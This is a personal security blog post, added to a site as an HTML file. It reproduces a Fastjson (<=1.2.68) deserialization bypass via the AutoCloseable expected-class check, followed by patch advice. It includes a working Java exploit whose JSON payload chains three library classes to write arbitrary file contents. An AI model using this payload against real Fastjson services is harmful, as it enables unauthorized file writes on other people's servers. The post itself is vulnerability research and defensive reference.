@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>Fastjson<=1.2.68漏洞复现</h1>
+                    <h2 class="subheading">Fastjson<=1.2.68漏洞复现</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on April 11, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;这次来看一下Fastjson高版本利用期望类绕过的手法，虽然分析之后觉得这个版本利用起来比较困难，并且调用链并非现在的我能够挖出来的，找到有用的文章也比较少。但也算了解了一下高版本Fastjson有哪些限制，以便日后要用到吧。</p>
+                
+                <h2 class="section-heading">影响版本</h2>
+
+                <p>Fastjson <= 1.2.68</p>
+                
+                <h2 class="section-heading">依赖</h2>
+                
+                <p>这里用的浅蓝师傅的读写文件的payload分析。</p>
+
+                <div>
+                	
+<pre class='hljs'><code><span class="hljs-tag">&lt;<span class="hljs-title">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-title">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-title">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-title">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-title">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-title">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-title">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">dependency</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-title">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-title">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-title">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">dependency</span>&gt;</span></code></pre>
+                	
+                	</div>
+                
+                
+                
+                <h2 class="section-heading">绕过分析</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;首先来到checkAutoType方法中，可以看到这里新增了safeMode变量的判断，不过在这个版本里默认是为false，后面的版本默认为true会直接抛出异常。
+                	接着在下面的if中判断是否在期望类的黑名单中，而AutoCloseable不在黑名单中，所以给expectClassFlag赋值为true。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-11/1-1.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-1.jpg" alt="">
+              	</a>
+              	
+              	
+              	 <p>&nbsp;&nbsp;&nbsp;并且在这里的if会先判断是否实现或者继承于ClassLoader、DataSource、RowSet，是的话就抛出异常，然后会判断typeName是否实现或者继承于Closeable接口，是的话就添加到Mapping中。
+              	 	所以到这里可以发现，必须要找实现或继承AutoCloseable接口的才能按这种思路绕过。</p>
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-11/1-2.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-2.jpg" alt="">
+              	</a>
+              	       	
+              	
+              	<p>&nbsp;&nbsp;&nbsp;基于以上思路可以找到OutputStream实现了Closeable接口，同时org.eclipse.core.internal.localstore.SafeFileOutputStream、com.esotericsoftware.kryo.io.Output、com.sleepycat.bind.serial.SerialOutput继承自OutputStream抽象类。</p>
+              		<p>&nbsp;&nbsp;&nbsp;先看到org.eclipse.core.internal.localstore.SafeFileOutputStream类，这里判断targetPath指定的文件不存在以及tempPath文件不存在时，调用BufferedOutputStream类和FileOutputStream类写入targetPath。</p>
+              	
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-11/1-3.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-3.jpg" alt="">
+              	</a>
+              	
+              	
+              	<p>&nbsp;&nbsp;&nbsp;接着来到com.esotericsoftware.kryo.io.Output类，可以看到在setBuffer方法中将payload中字符base64解码后放到this.buffer中，然后调用setOutputStream方法赋值给this.outputStream。</p>
+              	
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-11/1-4.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-4.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;最后需要利用com.sleepycat.bind.serial.SerialOutput类将缓冲区内容写入，可以看到这里super(out)触发了ObjectOutputStream的构造方法，以此来调用到了write方法来调用flush方法写入数据。
+              		不过想不明白作者是怎么扫到maven里的某个包有这个调用链。</p>
+              	
+                	
+                <a data-fancybox="gallery" href="../img/2022-4-11/1-5.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-5.jpg" alt="">
+              	</a>
+              	
+              	<p>&nbsp;&nbsp;&nbsp;除此之外，在EXP中还关注到了Fastjson提供的对象引用功能，可以看到$ref键值有类似模版渲染的东西。
+              		看了su18师傅博客中的图大概就懂了，outputStream中$.stream指的是调用stream中的对象，也就解释了为什么路径能够在后面正常获取，而不用去考虑不同类之间的关系。
+              		以此类推，out中的$ref键值$.writer就引用了writer中的对象，这样三个类就串在了一起。</p>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-4-11/1-6.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-6.jpg" alt="">
+              	</a>
+              	
+              	<a data-fancybox="gallery" href="../img/2022-4-11/1-7.jpg">
+                	<img class="img-fluid" src="../img/2022-4-11/1-7.jpg" alt="">
+              	</a>
+              	
+              	
+              	<h2 class="section-heading">EXP</h2>
+
+								<div>
+									
+									<pre class='hljs'><code><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-type">JSON</span>;
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.<span class="hljs-type">ParserConfig</span>;
+
+public class <span class="hljs-type">Fastjson7</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
+        <span class="hljs-type">ParserConfig</span>.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{\n"</span> +
+                <span class="hljs-string">"    \"stream\": {\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"java.lang.AutoCloseable\",\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n"</span> +
+                <span class="hljs-string">"        \"targetPath\": \"/Users/JackTime/IdeaProjects/javaSecurity/src/Fastjson/pwn.txt\",\n"</span> +
+                <span class="hljs-string">"        \"tempPath\": \"/Users/JackTime/IdeaProjects/javaSecurity/src/Fastjson/test.txt\"\n"</span> +
+                <span class="hljs-string">"    },\n"</span> +
+                <span class="hljs-string">"    \"writer\": {\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"java.lang.AutoCloseable\",\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n"</span> +
+                <span class="hljs-string">"        \"buffer\": \"c2V2ZW4=\",\n"</span> +
+                <span class="hljs-string">"        \"outputStream\": {\n"</span> +
+                <span class="hljs-string">"            \"$ref\": \"$.stream\"\n"</span> +
+                <span class="hljs-string">"        },\n"</span> +
+                <span class="hljs-string">"        \"position\": 5\n"</span> +
+                <span class="hljs-string">"    },\n"</span> +
+                <span class="hljs-string">"    \"close\": {\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"java.lang.AutoCloseable\",\n"</span> +
+                <span class="hljs-string">"        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n"</span> +
+                <span class="hljs-string">"        \"out\": {\n"</span> +
+                <span class="hljs-string">"            \"$ref\": \"$.writer\"\n"</span> +
+                <span class="hljs-string">"        }\n"</span> +
+                <span class="hljs-string">"    }\n"</span> +
+                <span class="hljs-string">"}\n"</span>;
+        <span class="hljs-type">JSON</span>.parse(payload);
+    }
+}</code></pre>
+									
+									
+									</div>
+							
+								
+								<h2 class="section-heading">补丁</h2>
+								
+								<p>&nbsp;&nbsp;&nbsp;后面的版本引入了safeMode来关闭反序列化，一旦反序列化后就会抛出异常。</p>
+								
+								<div>
+									
+									<pre class='hljs'><code># 开启<span class="hljs-tag">SafeMode</span>
+<span class="hljs-tag">ParserConfig</span><span class="hljs-class">.getGlobalInstance</span>()<span class="hljs-class">.setSafeMode</span>(true);
+
+# 添加黑名单
+<span class="hljs-tag">ParserConfig</span><span class="hljs-class">.getGlobalInstance</span>()<span class="hljs-class">.addDeny</span>(<span class="hljs-string">"org.openqa.selenium"</span>);</code></pre>
+									
+									</div>
+
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
